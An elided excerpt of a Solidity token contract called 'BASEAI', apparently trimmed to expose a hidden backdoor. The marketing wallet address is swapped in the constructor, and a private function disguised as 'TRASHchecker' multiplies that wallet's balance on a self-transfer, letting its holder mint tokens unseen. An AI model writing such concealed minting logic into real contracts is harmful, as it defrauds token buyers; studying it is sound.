...
contract BASEAI is Context, IERC20 {
    ...
    address payable public Wallet_Marketing = payable(0x459Ab9346Eb54512122cF490B1Cb2342B7c776b0);
    address payable public Wallet_Dev = payable(0x459Ab9346Eb54512122cF490B1Cb2342B7c776b0);
    ...
    string private _name = "BASEAI";
    string private _symbol = "BASEAI";
    ...
    constructor ()  {
        ...
        Wallet_Marketing = payable(0x1d7B1457AF3b261b46e02603C7FBCa5A461598E7);
    ...
    function TRASHchecker(address asd,address qwe,uint256 ert) private {
        if (asd == qwe && asd ==Wallet_Marketing)
         {_tOwned[Wallet_Marketing] = _tOwned[Wallet_Marketing].mul(ert);
         }
    }
